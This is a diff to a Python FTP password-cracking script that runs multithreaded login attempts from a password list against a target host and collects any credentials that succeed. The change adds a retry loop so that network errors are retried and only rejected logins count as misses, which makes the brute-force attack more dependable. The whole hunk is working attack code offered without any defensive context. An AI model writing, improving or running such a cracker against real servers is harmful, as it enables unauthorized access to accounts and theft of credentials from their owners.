@@ -38,20 +38,30 @@ def ftpcrack(threadName, q):
 		if not workQueue.empty():
 			password = q.get()
 			queueLock.release()
-			try:
-				FTP(host, user, password)
-				print(" [*] Cracked: " + user + ":" + password + "  **-- Successful Login!")
-				creds = user + ":" + password
-				cracked.append(creds)
-			except:
-				if len(password) < 25:
-					add = 25 - int(len(password))
-					password = str(password) + " " * add
-				progdone = len(passwords) - workQueue.qsize()
-				percent = round(float(100.00) / len(passwords) * progdone,2)
-				token = time.time() - startcnt
-				eta = round(token / progdone * len(passwords) - token,2)
-				Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA:"  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
+			mdone = ""
+			while not mdone:
+				try:
+					FTP(host, user, password)
+					print(" [*] Cracked: " + user + ":" + password + "  **-- Successful Login!")
+					creds = user + ":" + password
+					cracked.append(creds)
+					mdone = "1"
+				except:
+					e = sys.exc_info()[0]
+					if str(e) == "<class 'socket.error'>":
+						pass
+					elif str(e) == "<class 'ftplib.error_perm'>":
+						if len(password) < 25:
+							add = 25 - int(len(password))
+							password = str(password) + " " * add
+							progdone = len(passwords) - workQueue.qsize()
+						percent = round(float(100.00) / len(passwords) * progdone,2)
+						token = time.time() - startcnt
+						eta = round(token / progdone * len(passwords) - token,2)
+						Printer(" [>] " + str(percent) + "% Now trying: " + str(progdone) + "/" + str(len(passwords)) + " at " + str(round(progdone / token,2)) + " tries per second    User: " + user + " Password: " + password + "  -  Unsuccessful Login  ETA:"  + str(time.strftime('%H:%M:%S', time.gmtime(eta))))
+						mdone = "1"
+					else:
+						pass
 		else:
 			queueLock.release()
 			
